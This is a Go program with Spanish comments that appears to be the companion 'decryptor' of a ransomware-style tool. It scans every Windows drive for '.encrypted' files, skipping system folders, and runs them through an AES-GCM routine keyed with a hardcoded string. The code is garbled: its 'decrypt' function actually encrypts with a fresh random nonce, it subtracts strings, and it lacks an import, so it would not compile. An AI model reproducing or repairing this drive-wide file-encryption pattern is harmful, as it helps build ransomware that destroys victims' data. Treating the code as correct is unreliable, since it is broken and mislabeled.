package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"path/filepath"
)


func decryptFiles(files []string) error {
	fmt.Println("=== Iniciando cifrado de archivos ===\n")
	
	// Clave de cifrado: "ByClaude" (se expandirá a 32 bytes para AES-256)
	keyString := "ByClaude"
	key := expandKey(keyString, 32) // AES-256 requiere 32 bytes
	
	fmt.Printf("Clave de cifrado: %s\n", keyString)
	fmt.Printf("Tamaño de clave: %d bytes (AES-256)\n\n", len(key))
	
	if len(files) == 0 {
		fmt.Println("No hay archivos para descifrar.")
		return nil
	}
	
	successCount := 0
	failCount := 0
	
	for i, filePath := range files {
		fmt.Printf("[%d/%d] Descifrando: %s\n", i+1, len(files), filePath)
		
		err := decryptFile(filePath, key)
		if err != nil {
			fmt.Printf("  ✗ Error al descifrar: %v\n", err)
			failCount++
		} else {
			fmt.Printf("  ✓ Archivo descifrado exitosamente\n")
			successCount++
		}
	}
	
	fmt.Printf("\n=== DESCIFRADO COMPLETADO ===\n")
	fmt.Printf("Archivos descifrados exitosamente: %d\n", successCount)
	fmt.Printf("Archivos con error: %d\n\n", failCount)
	
	if failCount > 0 {
		return fmt.Errorf("se encontraron errores durante el descifrado")
	}
	
	return nil
}

func decryptFile(filePath string, key []byte) error {
	// Leer el archivo original
	plaintext, err := os.ReadFile(filePath)
	if err != nil {
		return fmt.Errorf("error al leer archivo: %v", err)
	}
	
	// Crear cipher AES
	block, err := aes.NewCipher(key)
	if err != nil {
		return fmt.Errorf("error al crear cipher: %v", err)
	}
	
	// Usar GCM (Galois/Counter Mode) para cifrado autenticado
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return fmt.Errorf("error al crear GCM: %v", err)
	}
	
	// Generar nonce aleatorio
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return fmt.Errorf("error al generar nonce: %v", err)
	}
	
	// Cifrar los datos
	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
	encriptedfilePath := filePath - ".encrypted"
	
	// Escribir el archivo cifrado (sobrescribir el original)
	err = os.WriteFile(encriptedfilePath, ciphertext, 0644)
	if err != nil {
		return fmt.Errorf("error al escribir archivo cifrado: %v", err)
	}
	
	return nil
}

func searchFiles() ([]string, error) {
	fmt.Println("=== Iniciando búsqueda de archivos ===")
	
	// Extensiones a buscar
	extensions := []string{".encrypted"}
	
	// Array para almacenar las rutas absolutas encontradas
	var foundFiles []string
	
	// Obtener todas las unidades del sistema (C:, D:, etc.)
	drives := getDrives()
	
	if len(drives) == 0 {
		return nil, fmt.Errorf("no se encontraron unidades de disco")
	}
	
	fmt.Printf("Buscando en unidades: %v\n\n", drives)
	
	// Recorrer cada unidad
	for _, drive := range drives {
		fmt.Printf("Escaneando unidad: %s\\\n", drive)
		
		err := filepath.Walk(drive+"\\", func(path string, info os.FileInfo, err error) error {
			// Ignorar errores de permisos en directorios específicos
			if err != nil {
				return nil // Continuar con el siguiente archivo
			}
			
			// Saltar directorios del sistema para acelerar la búsqueda
			if info.IsDir() && isSystemDirectory(path) {
				return filepath.SkipDir
			}
			
			// Verificar si el archivo tiene una extensión que buscamos
			if !info.IsDir() {
				ext := strings.ToLower(filepath.Ext(path))
				for _, targetExt := range extensions {
					if ext == targetExt {
						absPath, err := filepath.Abs(path)
						if err == nil {
							foundFiles = append(foundFiles, absPath)
							fmt.Printf("  Encontrado: %s\n", absPath)
						}
						break
					}
				}
			}
			
			return nil
		})
		
		if err != nil {
			fmt.Printf("Error durante el escaneo de %s: %v\n", drive, err)
		}
	}
	
	fmt.Printf("\n✓ Búsqueda completada. Total de archivos encontrados: %d\n\n", len(foundFiles))
	return foundFiles, nil
}

//Funciones auxiliares

func expandKey(keyString string, targetSize int) []byte {
	key := make([]byte, targetSize)
	keyBytes := []byte(keyString)
	
	// Copiar la clave original
	for i := 0; i < len(keyBytes) && i < targetSize; i++ {
		key[i] = keyBytes[i]
	}
	
	// Rellenar con el resto de la clave repetida si es necesario
	if len(keyBytes) < targetSize {
		for i := len(keyBytes); i < targetSize; i++ {
			key[i] = keyBytes[i%len(keyBytes)]
		}
	}
	
	return key
}


// getDrives obtiene todas las unidades lógicas del sistema
func getDrives() []string {
	var drives []string
	
	// Verificar unidades de la A a la Z
	for i := 0; i < 26; i++ {
		drive := string(rune('A'+i)) + ":"
		_, err := os.Stat(drive + "\\")
		if err == nil {
			drives = append(drives, drive)
		}
	}
	
	return drives
}
func isSystemDirectory(path string) bool {
	// Directorios que suelen ralentizar el escaneo
	systemDirs := []string{
		"System Volume Information",
		"$Recycle.Bin",
		"pagefile.sys",
		"hiberfil.sys",
		"Boot",
		"Windows",
		"System32",
		"ProgramData",
		"Program Files",
		"Program Files (x86)",
		"AppData",
		"Temp",
		".git",
		"node_modules",
	}
	
	pathLower := strings.ToLower(path)
	for _, sysDir := range systemDirs {
		if strings.Contains(pathLower, strings.ToLower(sysDir)) {
			return true
		}
	}
	
	return false
}
// printResults imprime los resultados de la búsqueda
func printResults(files []string) {
	fmt.Println("=== RESULTADOS DE LA BÚSQUEDA ===")
	fmt.Printf("Total de archivos encontrados: %d\n\n", len(files))
	
	if len(files) == 0 {
		fmt.Println("No se encontraron archivos con las extensiones buscadas.")
		return
	}
	
	for i, file := range files {
		fmt.Printf("%d. %s\n", i+1, file)
	}
}



func main(){
	// Paso 1: Buscar archivos encriptados
	files, err := searchFiles()
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
		os.Exit(1)
	}
	
	// Paso 2: Mostrar resultados
	printResults(files)

	// Paso 3: Cifrar archivos encontrados
	if err := decryptFiles(files); err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
		os.Exit(1)
	}



}